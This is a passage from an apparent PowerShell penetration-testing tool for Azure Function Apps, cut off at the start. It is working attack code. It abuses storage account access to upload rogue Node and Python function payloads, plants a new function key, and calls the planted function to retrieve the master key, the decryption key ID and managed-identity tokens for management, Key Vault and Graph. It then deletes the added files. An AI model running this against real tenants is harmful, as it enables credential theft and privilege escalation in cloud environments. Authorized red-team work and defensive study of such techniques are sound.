                            Set-AzStorageFileContent -Context $storageContext -ShareName $fileShareList.Name -Source $PSScriptRoot\Payloads\Node\Linux\index.js -Path site/wwwroot/$newFolder/index.js -Force -Verbose:$false | Out-Null
                        }

                        Write-Verbose "`t`t`t`t`tSleeping for 60 seconds before calling the new function"
                        sleep 60
                    
                        Write-Verbose "`t`t`t`t`tCalling the new function (until it stops 404-ing) to return the tokens and decryption key, this may take a while..."
                        Write-Verbose "`t`t`t`t`t`tAvoid hitting ctrl+C to break out of this, you will need to manually remove the added Storage Account files in order to clean up"

                        $httpResponseContent = $null

                        # Make request to the new function and return the results
                        while ($httpResponseContent -eq $null){
                            try{
                                $httpFullResponse = (Invoke-WebRequest -Uri "https://$currentApp.azurewebsites.net/api/$($newFolder)?name=$currentApp&code=$functionCode" -UseBasicParsing -Verbose:$false)
                                if ($httpFullResponse.StatusCode -eq 200){
                                    $httpResponseContent = $httpFullResponse.Content | ConvertFrom-Json
                                }
                                else{$httpResponseContent = "Something Failed"}
                            }
                            catch{}
                        }

                        # Handle missing MI Tokens and add to table
                        if($httpResponseContent.managementToken){$managementToken = $httpResponseContent.managementToken}else{$managementToken = "N/A"}
                        if($httpResponseContent.vaultToken){$vaultToken = $httpResponseContent.vaultToken}else{$vaultToken = "N/A"}
                        if($httpResponseContent.graphToken){$graphToken = $httpResponseContent.graphToken}else{$graphToken = "N/A"}
                        $TempTblkeys.Rows.Add($currentApp, $encryptedFunctionKeys.masterKey.value, $httpResponseContent.decryptionKeyId, $managementToken, $vaultToken, $graphToken) | Out-Null
                        

                        Write-Verbose "`t`t`t`t`tRemoving the files from the Storage Account"
                        # Remove temp files
                        Remove-Item $TempFile -Force | Out-Null

                        # Delete each of the added files and remove the folder from the Storage Account Share
                        try{Remove-AzStorageFile -Context $storageContext -ShareName $fileShareList.Name -Path site/wwwroot/$newFolder/function.json -Verbose:$false -ErrorAction Stop | Out-Null}catch{}
                        try{Remove-AzStorageFile -Context $storageContext -ShareName $fileShareList.Name -Path site/wwwroot/$newFolder/index.js -Verbose:$false -ErrorAction Stop | Out-Null}catch{}
                        try{Remove-AzStorageFile -Context $storageContext -ShareName $fileShareList.Name -Path site/wwwroot/$newFolder/project.assets.json -Verbose:$false -ErrorAction Stop | Out-Null}catch{}
                        try{Remove-AzStorageFile -Context $storageContext -ShareName $fileShareList.Name -Path site/wwwroot/$newFolder/NuGet/Migrations/1 -Verbose:$false -ErrorAction Stop | Out-Null}catch{}
                        try{Remove-AzStorageDirectory -ShareName $fileShareList.Name -Context $storageContext -Path site/wwwroot/$newFolder/NuGet/Migrations -ErrorAction Stop}catch{}
                        try{Remove-AzStorageDirectory -ShareName $fileShareList.Name -Context $storageContext -Path site/wwwroot/$newFolder/NuGet -ErrorAction Stop}catch{}
                        try{Remove-AzStorageDirectory -ShareName $fileShareList.Name -Context $storageContext -Path site/wwwroot/$newFolder -ErrorAction Stop}catch{}

                        # Delete generated funtion file from the Storage Account Container (azure-webjobs-secrets/$currentApp/$newFolder.json)
                        try{
                            Remove-AzStorageBlob -Context $storageContext -Container "azure-webjobs-secrets" -Blob (-join($currentApp,"/",$newFolder,".json").ToLower()) -Verbose:$false | Out-Null
                            $snapshotDelete = Get-AzStorageBlob -Context $storageContext -Name "azure-webjobs-secrets" | select Name | where Name -Match $newFolder.ToLower()
                            Remove-AzStorageBlob -Context $storageContext -Container "azure-webjobs-secrets" -Blob $snapshotDelete.Name -Verbose:$false | Out-Null
                            }
                        catch{}
                    }
                    "Python" {

                        # Get the function app keys to decrypt
                        $secretsFile = Get-AzStorageBlob -Context $storageContext -Name "azure-webjobs-secrets" | select Name | where Name -Match "host.json" | where Name -Match $_.FunctionApp
                        $secretsIter = 0
                        if($secretsfile.count -gt 1){
                            $secretsfile | ForEach-Object{
                                if($_.Name.split("/")[0] -eq $currentApp){$secretsfile = $secretsfile[$secretsIter]}
                                $secretsIter += 1
                            }
                        }
                        $TempFile = New-TemporaryFile
                        Get-AzStorageBlobContent -Container "azure-webjobs-secrets" -Blob $secretsFile.Name -Context $storageContext -Destination $TempFile -Verbose:$false -Force | Out-Null
                        $encryptedFunctionKeys = (gc $TempFile | ConvertFrom-Json)

                        # Find a function JSON file (not host.json) to use as a template
                        $TempJSONFileDown = New-TemporaryFile
                        $functionTemplateFile = Get-AzStorageBlob -Context $storageContext -Name "azure-webjobs-secrets" | select Name | where Name -Match ".json" | where Name -Match $_.FunctionApp | where Name -NotMatch "host.json"
                        Get-AzStorageBlobContent -Container "azure-webjobs-secrets" -Blob $functionTemplateFile[0].Name -Context $storageContext -Destination $TempJSONFileDown -Verbose:$false -Force | Out-Null

                        # Generate new json secrets file for the function
                        $newkey = @{
                            name = "tempfunckey"
                            value = (New-Guid).Guid
                            encrypted = $false
                        }
                        $functionCode = $newkey.value
                        
                        # Create a new object from the template file
                        $functionTemplate = (gc $TempJSONFileDown | ConvertFrom-Json)

                        # Add the key to the object
                        $functionTemplate.keys += $newkey
                        $TempJSONFile = New-TemporaryFile
                        $functionTemplate | ConvertTo-Json | Out-File $TempJSONFile

                        # Determine container OS
                        $hostENVvar = ($encryptedFunctionKeys.decryptionKeyId).Split("=")[0]
                                        
                        # Create new File Share (site/wwwroot/$newFolder) folder
                        $newFolder = -join ((65..90) + (97..122) | Get-Random -Count 15 | % {[char]$_})

                        # Upload the keys file
                        Set-AzStorageBlobContent -Container "azure-webjobs-secrets" -File $TempJSONFile -Blob (-join($currentApp,"/",$newFolder,".json").ToLower()) -Context $storageContext -Verbose:$false | Out-Null

                        Write-Verbose "`t`t`t`t`tCreating the $($newFolder) folder in the $($fileShareList.Name) File Share in the $($storageContext.Name) Storage Account and uploading files"

                        New-AzStorageDirectory -ShareName $fileShareList.Name -Context $storageContext -Path site/wwwroot/$newFolder | Out-Null

                        # Upload Linux PowerShell function files to the Storage Account
                        Set-AzStorageFileContent -Context $storageContext -ShareName $fileShareList.Name -Source $PSScriptRoot\Payloads\Python\function.json -Path site/wwwroot/$newFolder/function.json -Force -Verbose:$false | Out-Null
                        Set-AzStorageFileContent -Context $storageContext -ShareName $fileShareList.Name -Source $PSScriptRoot\Payloads\Python\requirements.txt -Path site/wwwroot/$newFolder/requirements.txt -Force -Verbose:$false | Out-Null
                        Set-AzStorageFileContent -Context $storageContext -ShareName $fileShareList.Name -Source $PSScriptRoot\Payloads\Python\__init__.py -Path site/wwwroot/$newFolder/__init__.py -Force -Verbose:$false | Out-Null

                        Write-Verbose "`t`t`t`t`tSleeping for 60 seconds before calling the new function"
                        sleep 60
                    
                        Write-Verbose "`t`t`t`t`tCalling the new function (until it stops 404-ing) to return the tokens and decryption key, this may take a while..."
                        Write-Verbose "`t`t`t`t`t`tAvoid hitting ctrl+C to break out of this, you will need to manually remove the added Storage Account files in order to clean up"

                        $httpResponseContent = $null

                        # Make request to the new function and return the results
                        while ($httpResponseContent -eq $null){
                            try{
                                $httpFullResponse = (Invoke-WebRequest -Uri "https://$currentApp.azurewebsites.net/api/$($newFolder)?name=$currentApp&code=$functionCode" -UseBasicParsing -Verbose:$false)
                                if ($httpFullResponse.StatusCode -eq 200){
                                    $httpResponseContent = $httpFullResponse.Content | ConvertFrom-Json
                                }
                                else{$httpResponseContent = "Something Failed"}
                            }
                            catch{}
                        }

                        # Handle missing MI Tokens and add to table
                        if($httpResponseContent.managementToken){$managementToken = $httpResponseContent.managementToken}else{$managementToken = "N/A"}
                        if($httpResponseContent.vaultToken){$vaultToken = $httpResponseContent.vaultToken}else{$vaultToken = "N/A"}
                        if($httpResponseContent.graphToken){$graphToken = $httpResponseContent.graphToken}else{$graphToken = "N/A"}
                        $TempTblkeys.Rows.Add($currentApp,$encryptedFunctionKeys.masterKey.value, $httpResponseContent.decryptionKeyId, $managementToken, $vaultToken, $graphToken) | Out-Null
                        

                        Write-Verbose "`t`t`t`t`tRemoving the files from the Storage Account"
                        # Remove temp files
                        Remove-Item $TempFile -Force | Out-Null

                        # Delete each of the added files and remove the folder from the Storage Account Share
                        try{Remove-AzStorageFile -Context $storageContext -ShareName $fileShareList.Name -Path site/wwwroot/$newFolder/function.json -Verbose:$false -ErrorAction Stop | Out-Null}catch{}
                        try{Remove-AzStorageFile -Context $storageContext -ShareName $fileShareList.Name -Path site/wwwroot/$newFolder/__init__.py -Verbose:$false -ErrorAction Stop | Out-Null}catch{}
                        try{Remove-AzStorageFile -Context $storageContext -ShareName $fileShareList.Name -Path site/wwwroot/$newFolder/requirements.txt -Verbose:$false -ErrorAction Stop | Out-Null}catch{}
                        try{Remove-AzStorageFile -Context $storageContext -ShareName $fileShareList.Name -Path site/wwwroot/$newFolder/project.assets.json -Verbose:$false -ErrorAction Stop | Out-Null}catch{}
                        try{Remove-AzStorageFile -Context $storageContext -ShareName $fileShareList.Name -Path site/wwwroot/$newFolder/NuGet/Migrations/1 -Verbose:$false -ErrorAction Stop | Out-Null}catch{}
                        try{Remove-AzStorageFile -Context $storageContext -ShareName $fileShareList.Name -Path site/wwwroot/$newFolder/__pycache__/__init__.cpython-310.pyc -Verbose:$false -ErrorAction Stop | Out-Null}catch{}
                        try{Remove-AzStorageDirectory -ShareName $fileShareList.Name -Context $storageContext -Path site/wwwroot/$newFolder/__pycache__ -ErrorAction Stop}catch{}
                        try{Remove-AzStorageDirectory -ShareName $fileShareList.Name -Context $storageContext -Path site/wwwroot/$newFolder/NuGet/Migrations -ErrorAction Stop}catch{}
                        try{Remove-AzStorageDirectory -ShareName $fileShareList.Name -Context $storageContext -Path site/wwwroot/$newFolder/NuGet -ErrorAction Stop}catch{}
                        try{Remove-AzStorageDirectory -ShareName $fileShareList.Name -Context $storageContext -Path site/wwwroot/$newFolder -ErrorAction Stop}catch{}

                        # Delete generated funtion file from the Storage Account Container (azure-webjobs-secrets/$currentApp/$newFolder.json)
                        try{
                            Remove-AzStorageBlob -Context $storageContext -Container "azure-webjobs-secrets" -Blob (-join($currentApp,"/",$newFolder,".json").ToLower()) -Verbose:$false | Out-Null
                            $snapshotDelete = Get-AzStorageBlob -Context $storageContext -Name "azure-webjobs-secrets" | select Name | where Name -Match $newFolder.ToLower()
                            Remove-AzStorageBlob -Context $storageContext -Container "azure-webjobs-secrets" -Blob $snapshotDelete.Name -Verbose:$false | Out-Null
                            }
                        catch{}
                    }
                    "CustomHandler" {
                    }
                    "UNDETERMINED" {Write-Verbose "`t`t`tThe tool was unable to determine the function language, probably due to a lack of existing functions, skipping the $($storageContext.Name) Storage Account"}
                }
                Write-Verbose "`t`tCompleted attacking the $($currentApp) Function App in the $currentShare File Share"
            }
        }
    }
    Write-Output $TempTblkeys
    Write-Verbose "All Function App / Storage Account attacks have completed"    
}

